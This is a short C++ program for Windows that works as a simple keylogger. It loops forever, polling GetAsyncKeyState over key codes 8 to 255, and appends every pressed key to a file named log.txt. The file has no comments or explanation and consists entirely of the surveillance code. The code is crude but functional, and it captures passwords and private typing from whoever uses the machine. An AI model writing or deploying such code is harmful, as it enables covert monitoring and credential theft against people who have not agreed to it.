#include <iostream>
#include <string>
#include <map>
#include <fstream>
#include <Windows.h>
using namespace std;
int Save(int _key, char *file)
{
	cout<<_key<<endl;
	FILE *OUTPUT_FILE;
	OUTPUT_FILE = fopen(file,"a+");

	fprintf(OUTPUT_FILE,"%s",&_key);
	fclose(OUTPUT_FILE);
	return 0;
	
}

int main()
{
	char i;
	while(true)
	{
		for(int i=8;i<=255;i++)
		{
			if(GetAsyncKeyState(i)== -32767)
			{
				Save(i,"log.txt");
			}
		}
	}
	
}

